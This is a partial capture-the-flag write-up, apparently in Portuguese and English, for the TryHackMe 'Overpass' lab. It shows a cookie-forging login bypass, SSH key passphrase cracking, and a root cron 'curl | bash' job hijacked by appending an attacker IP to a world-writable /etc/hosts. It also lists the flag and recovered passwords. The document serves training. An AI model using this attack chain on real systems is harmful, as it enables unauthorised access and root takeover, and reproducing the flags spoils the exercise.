# overpass — TryHackMe

```text
[ TARGET ] 10.64.187.55
[ ROOM   ] Overpass
[ GOAL   ] user.txt / root.txt
[ STATUS ] PARTIAL — user OK; root via cron/hosts em andamento
```

## 01 — Web / login bypass

```console
$ curl -s http://10.64.187.55/login.js
# login seta cookie SessionToken = resposta de /api/login
```

```console
$ # bypass: cookie arbitrário
document.cookie = "SessionToken=abc123; path=/";
$ curl -s -b "SessionToken=abc123" http://10.64.187.55/admin/
# painel admin + RSA privada de James (encrypted)
```

→ Achado: auth só no client; admin vaza `james_id_rsa`. (raw: `recuperado.txt`, `james_id_rsa`)
→ Próximo: ssh2john + rockyou.

## 02 — Crack chave + SSH

```console
$ python3 ssh2john.py james_id_rsa > james.hash
$ john --wordlist=rockyou.txt james.hash
passphrase: james13

$ chmod 600 james_id_rsa
$ ssh -i james_id_rsa james@10.64.187.55
james@…:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
```

→ Achado: user flag. (raw: `james.hash`)
→ Próximo: privesc.

## 03 — Loot local / rot13 overpass

```console
$ cat ~/.overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.

$ # decode rot47-ish / ROT do app →
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

→ Achado: senha do password manager local.
→ `sudo -l` sem permissão para james.

## 04 — Cron root (buildscript)

```console
$ cat /etc/crontab
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

```console
$ ls -l /etc/hosts
-rw-rw-rw- 1 root root … /etc/hosts

$ getent hosts overpass.thm
127.0.0.1  overpass.thm

# redirecionar overpass.thm → IP VPN do attacker
$ echo "192.168.136.19 overpass.thm" >> /etc/hosts   # (lab: 192.168.136.19)
```

→ Achado: cron root faz `curl|bash` em `overpass.thm`; `/etc/hosts` world-writable.
→ Próximo: servir `buildscript.sh` malicioso no attacker → root.txt.
→ Artefato local de build: `buildscript.sh`, `overpass.go`, `overpassMacOS`.

## FLAGS / RESPOSTAS

| Item | Valor |
|---|---|
| user.txt | `thm{65c1aaf000506e56996822c6281e6bf7}` |
| james SSH key pass | `james13` |
| .overpass System | `saydrawnlyingpicture` |
| root.txt | *(completar após payload no cron)* |

## Artefatos

`recuperado.txt` · `james_id_rsa` · `james.hash` · `ssh2john_fixed.py` · `buildscript.sh` · `overpass.go` · `overpass.goes` · `overpassMacOS` · `go.mod` · `go.sum`
